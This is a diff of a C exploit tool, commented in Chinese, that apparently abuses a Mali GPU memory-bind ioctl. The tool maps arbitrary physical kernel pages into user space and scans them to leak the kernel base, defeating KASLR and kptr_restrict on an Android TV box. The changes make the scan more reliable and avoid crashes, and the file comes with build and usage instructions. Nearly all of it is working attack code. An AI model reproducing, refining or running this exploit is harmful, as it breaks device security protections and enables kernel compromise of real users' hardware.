@@ -1,19 +1,19 @@
 /*
- * kort_leak_scan.c - 用推荐的物理映射原语「自泄露」内核地址
+ * kort_leak_scan.c - 用推荐的物理映射原语「自泄露」内核地址 (防重启版)
  *
- * 方法 (见 use.md §6 / uses.md 推导方法 / kort_phys_read2.c):
- *   1. MEM_BIND (CVE-2024-31317, nr=2, 0xC0288302) 把任意内核物理页绑到 GPU VA
- *   2. 对 /dev/mali 做 mmap -> 直接从 CPU 读该物理页
- *   3. 扫描内核 Image 定位基址:
- *        - "Linux version" 字符串 (最稳的 banner)
- *        - ARM64 Image header magic 0x644d5241 ("ARM\x64") @ +0x38 (= _stext 页)
- *   4. 由此拿到内核物理基址 -> 结合已知符号偏移即可绕过 kptr_restrict / KASLR
+ * 方法 (use.md §6 / uses.md / kort_phys_read2.c):
+ *   MEM_BIND (CVE-2024-31317, nr=2, 0xC0288302) 把内核物理页绑到 GPU VA
+ *   -> 对 /dev/mali mmap(PROT_READ) -> 直接从 CPU 读该物理页
+ *   -> 扫 "Linux version" banner + ARM64 Image 头 magic 0x644d5241(@+0x38) 定位基址
  *
- * 关键坑 (直接导致能否读):
- *   BIND_MEM 40 字节布局中 phys_addr 必须放偏移 24、rights 放 28
- *   (kort_phys_read.c 用 @20 -> mmap EFAULT 失败; 本文件用修正版 @24/@28)
+ * 为什么之前一扫就重启 (本版已修):
+ *   1) 默认扫描窗口从 0x01000000 起, 该地址在 Mi Box S 上位于内核 Image
+ *      (基址 0x01080000) 之下, 属 ATF/BL2/保留设备内存; 把它 BIND 后 CPU 一读
+ *      触发总线异常(SError) -> 内核 panic -> 重启.  -> 窗口改为从 0x01080000 向上.
+ *   2) MEM_UNBIND(0xC0108303) 是未验证 ioctl, 可能本身是崩溃源.
+ *      -> 本版彻底不用 unbind, 改用「轮换 GPU VA 池」避免同一 VA 重复绑定冲突.
  *
- * 安全: 纯只读测试, 零写入。每步 alarm() 超时保护防驱动挂起。
+ * 安全: 纯只读, 零写入. 每步 alarm() 超时保护.
  *
  * 编译 (NDK 21.4, 32 位 armeabi-v7a, 静态):
  *   set NDK=C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529
@@ -21,10 +21,13 @@
  *   %CLANG% kort_leak_scan.c -o kort_leak_scan -static
  *
  * 用法:
- *   kort_leak_scan                扫描默认窗口 0x01000000..0x01400000 找内核基址
- *   kort_leak_scan -s 0x00800000 0x02000000   自定义扫描范围
- *   kort_leak_scan -p 0x01080000  dump 单页(Image 头 + banner 校验)
- *   kort_leak_scan -p 0x01080000 -d            额外 hexdump 0x200 字节
+ *   kort_leak_scan                 扫描默认窗口 0x01080000..0x01480000 (已知 RAM)
+ *   kort_leak_scan -s 0x01080000 0x01600000   自定义窗口(务必在 System RAM 内!)
+ *   kort_leak_scan -p 0x01080000              单页 dump(Image 头 + banner 校验)
+ *   kort_leak_scan -p 0x01080000 -d           额外 hexdump 0x200 字节
+ *
+ * 找准确 RAM 边界(避免重启的关键):
+ *   adb shell "cat /proc/iomem"   看 "Kernel" / "System RAM" 起止, 只扫那段
  */
 
 #include <stdio.h>
@@ -41,9 +44,9 @@
 
 /* ---- Mali Utgard ioctl (r10p1, 已验证) ---- */
 #define MALI_IOC_MEM_BIND   0xC0288302   /* _IOWR(0x83, 2, 40)  */
-#define MALI_IOC_MEM_UNBIND 0xC0108303   /* _IOWR(0x83, 3, 16)  */
 
-#define GPU_VA       0x41000000u        /* 绑定时用的 GPU 虚拟地址 */
+#define GPU_VA_BASE  0x41000000u        /* 绑定 VA 池基址 */
+#define VA_POOL      512                /* 轮换 VA 数量(避免重复绑定冲突, 不调用 unbind) */
 #ifndef PAGE_SIZE
 #define PAGE_SIZE    0x1000
 #endif
@@ -62,7 +65,7 @@ static int tio(int fd, unsigned int cmd, void *buf, int t) {
     return r == 0 ? 0 : -e;
 }
 
-/* BIND 一页物理内存到 GPU_VA (修正布局: phys@24, rights@28) */
+/* BIND 一页物理内存到指定 GPU_VA (修正布局: phys@24, rights@28) */
 static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
     uint8_t raw[40];
     memset(raw, 0, sizeof(raw));
@@ -77,29 +80,13 @@ static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
     return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
 }
 
-/* best-effort 解绑, 避免扫描时映射堆积 */
-static void unbind_phys(int fd, uint32_t gpu_va) {
-    uint8_t raw[16];
-    memset(raw, 0, sizeof(raw));
-    uint64_t ctx = 0;
-    uint32_t va = gpu_va;
-    memcpy(raw + 0, &ctx, 8);
-    memcpy(raw + 8, &va,  4);
-    tio(fd, MALI_IOC_MEM_UNBIND, raw, 2);
-}
-
-/* 读一页: bind -> mmap(PROT_READ) -> copy -> munmap -> unbind
- * 返回 0 成功, out 至少 PAGE_SIZE 字节 */
-static int read_page(int fd, uint32_t phys, uint8_t *out) {
-    if (bind_phys(fd, phys, GPU_VA, PAGE_SIZE) != 0) return -1;
-    void *m = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, GPU_VA);
-    if (m == MAP_FAILED) {
-        unbind_phys(fd, GPU_VA);
-        return -2;
-    }
+/* 读一页: bind(va) -> mmap(PROT_READ) -> copy -> munmap (不调用 unbind) */
+static int read_page_va(int fd, uint32_t phys, uint32_t gpu_va, uint8_t *out) {
+    if (bind_phys(fd, phys, gpu_va, PAGE_SIZE) != 0) return -1;
+    void *m = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, gpu_va);
+    if (m == MAP_FAILED) return -2;
     memcpy(out, m, PAGE_SIZE);
     munmap(m, PAGE_SIZE);
-    unbind_phys(fd, GPU_VA);
     return 0;
 }
 
@@ -122,32 +109,34 @@ static void hexdump(const uint8_t *b, int n) {
     }
 }
 
-/* 扫描: 在 [start,end) 逐页找 "Linux version" banner 与 ARM64 头 magic */
+/* 扫描: 在 [start,end) 逐页找 banner 与 ARM64 头 magic (只用 RAM 窗口!) */
 static void scan_range(int fd, uint32_t start, uint32_t end) {
-    printf("[*] scan phys 0x%08x .. 0x%08x (step 0x%x)\n", start, end, PAGE_SIZE);
+    printf("[*] scan phys 0x%08x .. 0x%08x (step 0x%x, VA pool=%d)\n",
+           start, end, PAGE_SIZE, VA_POOL);
+    printf("[*] 注意: 只扫 System RAM! 扫到设备/保留内存会重启设备\n");
     uint8_t page[PAGE_SIZE];
-    int found = 0;
+    int found = 0, idx = 0;
     for (uint32_t pa = start; pa < end; pa += PAGE_SIZE) {
-        int r = read_page(fd, pa, page);
-        if (r != 0) continue;                       /* 失败/超时/不可映射页跳过 */
+        uint32_t va = GPU_VA_BASE + (uint32_t)(idx % VA_POOL) * PAGE_SIZE;
+        int r = read_page_va(fd, pa, va, page);
+        idx++;
+        if (r == -2) continue;                       /* mmap EFAULT: 跳过该页 */
+        if (r != 0)  continue;                       /* bind 失败(含 VA 复用冲突): 跳过 */
 
         int off_banner = find_str(page, PAGE_SIZE, "Linux version");
-        /* ARM64 Image header magic @ +0x38 (little-endian 0x644d5241) */
         uint32_t magic = 0;
         if (PAGE_SIZE >= 0x3C) memcpy(&magic, page + 0x38, 4);
         int is_stext = (magic == 0x644d5241u);
-        uint32_t code0 = 0;
-        memcpy(&code0, page, 4);
+        uint32_t code0 = 0; memcpy(&code0, page, 4);
 
         if (off_banner >= 0 || is_stext) {
             printf("\n[+] HIT phys=0x%08x", pa);
-            if (is_stext)   printf("  ARM64_MAGIC(_stext)");
-            if (off_banner >= 0) printf("  \"Linux version\"@+0x%x", off_banner);
+            if (is_stext)      printf("  ARM64_MAGIC(_stext)");
+            if (off_banner>=0) printf("  \"Linux version\"@+0x%x", off_banner);
             printf("\n");
             if (is_stext)
                 printf("    code0=0x%08x (expect 0x14498000 for 4KB-page 4.9)\n", code0);
             if (off_banner >= 0) {
-                /* 打印整行 banner */
                 int e = off_banner;
                 while (e < PAGE_SIZE && page[e] != '\n') e++;
                 printf("    banner: ");
@@ -158,7 +147,7 @@ static void scan_range(int fd, uint32_t start, uint32_t end) {
             if (found >= 4) { printf("\n[*] 已找到 %d 处, 停止扫描\n", found); break; }
         }
     }
-    if (!found) printf("[-] 未在窗口内找到内核 Image, 用 -s 扩大/移动范围\n");
+    if (!found) printf("[-] 窗口内未找到内核 Image; 用 -s 缩小到 System RAM, 或 -p 直接读已知基址\n");
 }
 
 int main(int argc, char **argv) {
@@ -166,7 +155,7 @@ int main(int argc, char **argv) {
     sigaction(SIGALRM, &sa, NULL);
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    uint32_t start = 0x01000000u, end = 0x01400000u;
+    uint32_t start = 0x01080000u, end = 0x01480000u;
     uint32_t pa = 0; int have_pa = 0, dump = 0;
 
     int c;
@@ -187,9 +176,9 @@ int main(int argc, char **argv) {
     if (have_pa) {
         uint8_t page[PAGE_SIZE];
         printf("[*] read single page phys=0x%08x\n", pa);
-        int r = read_page(fd, pa, page);
-        if (r == -2) { printf("[-] mmap failed (EFAULT? 检查 phys@24/rights@28 布局)\n"); }
-        else if (r != 0) { printf("[-] bind failed\n"); }
+        int r = read_page_va(fd, pa, GPU_VA_BASE, page);
+        if (r == -2)      printf("[-] mmap failed (EFAULT? 检查 phys@24/rights@28 布局)\n");
+        else if (r != 0)  printf("[-] bind failed\n");
         else {
             uint32_t code0 = 0; memcpy(&code0, page, 4);
             uint32_t magic = 0; memcpy(&magic, page + 0x38, 4);
